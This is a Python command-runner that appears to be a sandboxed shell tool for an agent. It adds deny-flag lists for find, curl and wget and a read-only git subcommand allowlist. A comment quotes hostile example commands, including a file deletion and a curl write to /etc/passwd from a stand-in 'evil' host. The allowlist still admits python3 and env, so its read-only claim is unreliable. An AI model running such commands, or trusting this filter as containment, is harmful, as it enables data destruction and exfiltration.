#!/usr/bin/env python3
import argparse, json, shlex, subprocess
# Read-only allowlist only — no destructive filesystem ops
ALLOWLIST = {"ls","cat","echo","pwd","date","python3","git","curl","wget","jq","find","grep","wc","head","tail","sort","uniq","env","which","df","du","ps","id","hostname"}

# The allowlist above only vets the binary name — every argument after it was
# passed straight through, so an otherwise-"safe" binary could still be used
# to write files, exfiltrate data, or execute arbitrary commands (e.g.
# `find / -delete`, `curl -o /etc/passwd http://evil`, `git push`). These
# deny flags close that gap for the binaries where it matters most.
DENY_FLAGS = {
    "find": {"-delete", "-exec", "-execdir", "-fprint", "-fprint0", "-fprintf", "-ok", "-okdir"},
    "curl": {"-o", "-O", "--output", "--remote-name", "--remote-name-all",
             "-T", "--upload-file", "-d", "--data", "--data-raw",
             "--data-binary", "--data-urlencode", "--data-ascii"},
    "wget": {"-O", "--output-document", "--post-data", "--post-file"},
}
# git is broad enough (push, config, clone-to-arbitrary-remote, reset --hard)
# that a denylist would be easy to miss a case on — allowlist the read-only
# subcommands actually needed for inspecting repo state instead.
GIT_ALLOWED_SUBCOMMANDS = {"log", "show", "diff", "status", "branch", "remote",
                           "rev-parse", "ls-files", "blame", "describe", "shortlog"}

def _check_args(tokens):
    binary = tokens[0]
    if binary == "git":
        sub = tokens[1] if len(tokens) > 1 else None
        if sub not in GIT_ALLOWED_SUBCOMMANDS:
            raise PermissionError(f"git subcommand not allowed: {sub!r}")
        return
    deny = DENY_FLAGS.get(binary)
    if deny:
        for tok in tokens[1:]:
            if tok in deny:
                raise PermissionError(f"flag not allowed for {binary}: {tok!r}")

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--cmd",required=True); p.add_argument("--timeout",type=int,default=10); p.add_argument("--workdir",default="/tmp")
    a = p.parse_args()
    try:
        tokens = shlex.split(a.cmd)
        if not tokens or tokens[0] not in ALLOWLIST:
            raise PermissionError(f"Command not in allowlist: {tokens[0] if tokens else '(empty)'}")
        _check_args(tokens)
        r = subprocess.run(tokens, capture_output=True, text=True, timeout=a.timeout, cwd=a.workdir)
        print(json.dumps({"ok":r.returncode==0,"tool":"shell-exec","stdout":r.stdout[:2000],"stderr":r.stderr[:500]}))
    except subprocess.TimeoutExpired:
        print(json.dumps({"ok":False,"tool":"shell-exec","error":"timeout"}))
    except Exception as e:
        print(json.dumps({"ok":False,"tool":"shell-exec","error":str(e)}))
if __name__=="__main__": main()
